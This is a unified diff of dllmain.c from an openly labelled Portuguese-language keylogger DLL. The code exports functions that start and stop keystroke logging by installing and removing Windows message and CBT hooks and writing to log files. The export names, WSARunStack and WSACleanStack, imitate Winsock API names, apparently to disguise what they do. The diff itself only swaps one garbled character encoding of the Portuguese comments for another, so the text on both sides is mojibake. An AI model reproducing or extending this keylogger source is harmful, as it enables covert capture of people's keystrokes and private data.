@@ -1,26 +1,26 @@
 /*++ 
 
-  Nome do mÛdulo:
+  Nome do m√≥dulo:
   
 	dllmain.c
 
-  DescriÁ„o:
+  Descri√ß√£o:
 
-	Este cÛdigo fonte contÈm funÁıes exportadas para inicar/parar
-	a keylogger. Tais funÁıes tambÈm chamam outras funÁıes para
+	Este c√≥digo fonte cont√©m fun√ß√µes exportadas para inicar/parar
+	a keylogger. Tais fun√ß√µes tamb√©m chamam outras fun√ß√µes para
 	trabalhar com hooks e arquivos de logs.
 
   Autor:
 
 	Daniel Koch (Backz)
 
-  HistÛrico:
+  Hist√≥rico:
 
 	Maio-2004 Daniel K.
 		Criado.
 
 	15-Maio-2004 Daniel K.
-		Vers„o 0.2 totalmente em portuguÍs (leia o changelog).
+		Vers√£o 0.2 totalmente em portugu√™s (leia o changelog).
 
 --*/
 
@@ -31,7 +31,7 @@
 
 static HINSTANCE hInstance;
 
-// funÁ„o principal da DLL
+// fun√ß√£o principal da DLL
 BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)
 {
 	switch(fdwReason)
@@ -42,7 +42,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)
 		{
 			hInstance = hinstDll;
 			// desabilitar o DLL_THREAD_ATTACH e o DLL_THREAD_DETACH
-			// j· que a DLL n„o ir· ser chamada assim
+			// j√° que a DLL n√£o ir√° ser chamada assim
 			DisableThreadLibraryCalls(hinstDll);
 		}
 		break;
@@ -66,11 +66,11 @@ BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)
 
 
 // para iniciar a keylogger 
-// esta funÁ„o retorna TRUE se funcionar, FALSE caso contr·rio
+// esta fun√ß√£o retorna TRUE se funcionar, FALSE caso contr√°rio
 BOOL CALL WSARunStack(const char *log_filename_ent, BOOL show_error_reason)
 {
 
-	// ativando mensagens de erro (ou n„o)
+	// ativando mensagens de erro (ou n√£o)
 	set_show_error(show_error_reason);
 
 	// criando e testando a hook pra mensagens do windows
@@ -93,7 +93,7 @@ BOOL CALL WSARunStack(const char *log_filename_ent, BOOL show_error_reason)
 }
 
 // para parar a keylogger 
-// deve retornar TRUE se funcionar, FALSE caso contr·rio
+// deve retornar TRUE se funcionar, FALSE caso contr√°rio
 BOOL CALL WSACleanStack(void)
 {
 	BOOL result = TRUE;
@@ -103,7 +103,7 @@ BOOL CALL WSACleanStack(void)
 	message_hook = return_message_hook();
 	cbt_hook = return_cbt_hook();
 	
-	// p·ra a hook de mensagens do windows 
+	// p√°ra a hook de mensagens do windows 
 	if(message_hook != NULL)
 	{
 		if(!destroy_GetMessage_hook())
@@ -111,7 +111,7 @@ BOOL CALL WSACleanStack(void)
 		
 	}
 
-	// p·ra a hook de CBT (janelas)
+	// p√°ra a hook de CBT (janelas)
 	if(cbt_hook != NULL)
 	{
 		if(!destroy_CBT_hook())
